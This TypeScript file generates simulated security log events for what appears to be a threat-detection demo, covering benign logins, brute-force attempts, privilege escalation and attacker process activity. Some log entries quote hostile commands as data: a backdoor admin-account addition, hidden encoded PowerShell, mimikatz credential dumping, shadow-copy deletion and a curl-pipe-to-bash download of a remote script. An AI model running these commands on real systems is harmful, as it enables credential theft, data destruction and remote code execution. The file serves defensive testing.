import { LogEvent } from '../types';

/**
 * Realistic simulated system security events representing standard enterprise endpoints,
 * domain controllers, web servers, and developer workstations.
 */
export function generateSystemDemoEvents(): LogEvent[] {
  const baseTime = Date.now() - 3600 * 1000; // 1 hour ago

  const events: LogEvent[] = [
    // -------------------------------------------------------------
    // Scenario 1: Normal Benign Logins & Process Activity
    // -------------------------------------------------------------
    {
      id: 'sys-demo-01',
      timestamp: new Date(baseTime + 60000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'sshd[12480]: Accepted publickey for sarah.chen from 10.0.1.45 port 52314 ssh2: RSA SHA256:7uK384...',
      rawData: 'Feb 12 10:01:00 app-prod-01 sshd[12480]: Accepted publickey for sarah.chen from 10.0.1.45 port 52314 ssh2',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'app-prod-01',
        userName: 'sarah.chen',
        sourceIp: '10.0.1.45',
        processName: 'sshd',
        processId: 12480
      }
    },
    {
      id: 'sys-demo-02',
      timestamp: new Date(baseTime + 120000).toISOString(),
      source: 'syslog',
      logType: 'SYSTEM',
      message: 'systemd[1]: Started User Manager for UID 1002 (sarah.chen).',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'app-prod-01',
        userName: 'sarah.chen',
        processName: 'systemd',
        processId: 1
      }
    },
    {
      id: 'sys-demo-03',
      timestamp: new Date(baseTime + 180000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4624: An account was successfully logged on. TargetUserName: dev_user01, Computer: WS-DEV-09',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'WS-DEV-09',
        userName: 'dev_user01',
        sourceIp: '10.0.2.110',
        processName: 'lsass.exe'
      }
    },

    // -------------------------------------------------------------
    // Scenario 2: Single Isolated Failed Login (Benign user typo)
    // -------------------------------------------------------------
    {
      id: 'sys-demo-04',
      timestamp: new Date(baseTime + 300000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'sshd[13100]: Failed password for john.doe from 192.168.10.55 port 49822 ssh2',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'app-prod-01',
        userName: 'john.doe',
        sourceIp: '192.168.10.55',
        processName: 'sshd',
        processId: 13100
      }
    },

    // -------------------------------------------------------------
    // Scenario 3: Repeated Failed Logins / Brute Force Burst (User: admin)
    // -------------------------------------------------------------
    {
      id: 'sys-demo-05',
      timestamp: new Date(baseTime + 600000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },
    {
      id: 'sys-demo-06',
      timestamp: new Date(baseTime + 615000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },
    {
      id: 'sys-demo-07',
      timestamp: new Date(baseTime + 630000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },
    {
      id: 'sys-demo-08',
      timestamp: new Date(baseTime + 645000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },
    {
      id: 'sys-demo-09',
      timestamp: new Date(baseTime + 660000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },
    {
      id: 'sys-demo-10',
      timestamp: new Date(baseTime + 675000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4625: An account failed to log on. TargetUserName: admin, Computer: DC01.corp.internal, IpAddress: 198.51.100.77',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'admin',
        sourceIp: '198.51.100.77',
        processName: 'lsass.exe'
      }
    },

    // -------------------------------------------------------------
    // Scenario 4: Suspicious Auth Sequence (Failures followed by Success for bob.martinez)
    // -------------------------------------------------------------
    {
      id: 'sys-demo-11',
      timestamp: new Date(baseTime + 1200000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.88 user=bob.martinez',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'bob.martinez',
        sourceIp: '203.0.113.88',
        processName: 'sshd'
      }
    },
    {
      id: 'sys-demo-12',
      timestamp: new Date(baseTime + 1220000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.88 user=bob.martinez',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'bob.martinez',
        sourceIp: '203.0.113.88',
        processName: 'sshd'
      }
    },
    {
      id: 'sys-demo-13',
      timestamp: new Date(baseTime + 1240000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.88 user=bob.martinez',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'bob.martinez',
        sourceIp: '203.0.113.88',
        processName: 'sshd'
      }
    },
    {
      id: 'sys-demo-14',
      timestamp: new Date(baseTime + 1280000).toISOString(),
      source: 'auth.log',
      logType: 'SYSTEM',
      message: 'sshd[18221]: Accepted password for bob.martinez from 203.0.113.88 port 41208 ssh2',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'bob.martinez',
        sourceIp: '203.0.113.88',
        processName: 'sshd',
        processId: 18221
      }
    },

    // -------------------------------------------------------------
    // Scenario 5: Privilege Escalation (sudo elevation & local admin addition)
    // -------------------------------------------------------------
    {
      id: 'sys-demo-15',
      timestamp: new Date(baseTime + 1800000).toISOString(),
      source: 'sudo.log',
      logType: 'SYSTEM',
      message: 'sudo: bob.martinez : TTY=pts/2 ; PWD=/home/bob.martinez ; USER=root ; COMMAND=/bin/su -',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'bob.martinez',
        commandLine: '/bin/su -',
        processName: 'sudo',
        integrityLevel: 'High'
      }
    },
    {
      id: 'sys-demo-16',
      timestamp: new Date(baseTime + 1850000).toISOString(),
      source: 'Security.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 4732: A member was added to a security-enabled local group. MemberName: backdoor_svc, TargetUserName: Administrators, Computer: DC01.corp.internal',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'DC01.corp.internal',
        userName: 'Administrator',
        commandLine: 'net localgroup administrators backdoor_svc /add',
        processName: 'cmd.exe',
        parentProcess: 'powershell.exe'
      }
    },

    // -------------------------------------------------------------
    // Scenario 6: Suspicious Process Activity (Encoded PowerShell, Mimikatz, Web Shell)
    // -------------------------------------------------------------
    {
      id: 'sys-demo-17',
      timestamp: new Date(baseTime + 2100000).toISOString(),
      source: 'Sysmon.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 1: Process Creation. Image: C:\\Windows\\System32\\powershell.exe, CommandLine: powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt..., ParentImage: C:\\Windows\\System32\\w3wp.exe',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'IIS-WEB-01',
        userName: 'IIS_IUSRS',
        processName: 'powershell.exe',
        parentProcess: 'w3wp.exe',
        commandLine: 'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt...'
      }
    },
    {
      id: 'sys-demo-18',
      timestamp: new Date(baseTime + 2200000).toISOString(),
      source: 'Sysmon.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 1: Process Creation. Image: C:\\Users\\Public\\mimikatz.exe, CommandLine: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit, ParentImage: C:\\Windows\\System32\\cmd.exe',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'WS-FINANCE-04',
        userName: 'guest_audit',
        processName: 'mimikatz.exe',
        parentProcess: 'cmd.exe',
        commandLine: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
      }
    },
    {
      id: 'sys-demo-19',
      timestamp: new Date(baseTime + 2300000).toISOString(),
      source: 'Sysmon.evtx',
      logType: 'SYSTEM',
      message: 'Event ID 1: Process Creation. Image: C:\\Windows\\System32\\vssadmin.exe, CommandLine: vssadmin delete shadows /all /quiet, ParentImage: C:\\Windows\\Temp\\loader.exe',
      format: 'KEY_VALUE',
      normalizedFields: {
        hostName: 'WS-FINANCE-04',
        userName: 'guest_audit',
        processName: 'vssadmin.exe',
        parentProcess: 'loader.exe',
        commandLine: 'vssadmin delete shadows /all /quiet'
      }
    },

    // -------------------------------------------------------------
    // Scenario 7: Linux Reconnaissance & Remote Script Execution
    // -------------------------------------------------------------
    {
      id: 'sys-demo-20',
      timestamp: new Date(baseTime + 2400000).toISOString(),
      source: 'audit.log',
      logType: 'SYSTEM',
      message: 'type=EXECVE msg=audit(1676203200.123:892): argc=3 a0="curl" a1="http://198.51.100.99/stage2.sh" a2="| bash"',
      format: 'SYSLOG',
      normalizedFields: {
        hostName: 'web-dmz-02',
        userName: 'www-data',
        processName: 'curl',
        commandLine: 'curl http://198.51.100.99/stage2.sh | bash'
      }
    }
  ];

  return events;
}
